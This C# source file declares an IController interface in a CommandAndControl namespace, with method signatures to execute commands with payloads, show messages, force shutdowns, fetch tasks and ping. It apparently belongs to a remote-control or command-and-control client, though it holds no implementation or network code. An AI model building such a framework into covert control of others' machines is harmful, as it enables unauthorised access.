using System;
using System.Collections.Generic;
using System.Text;

using Command = CommandAndControl.Commands.Command;
using ShutdownType = CommandAndControl.Commands.ShutdownType;

namespace CommandAndControl
{
    public interface IController
    {
        void ExecuteAndRespond(object data);
        bool Execute(Command command, byte[] payload);
        bool ShowMessage(string message);
        bool Shutdown(ShutdownType shutdownType = ShutdownType.Shutdown, int delay = 0, bool force = true, string message = "");
        bool GetTasks();
        bool Ping();
    }
}
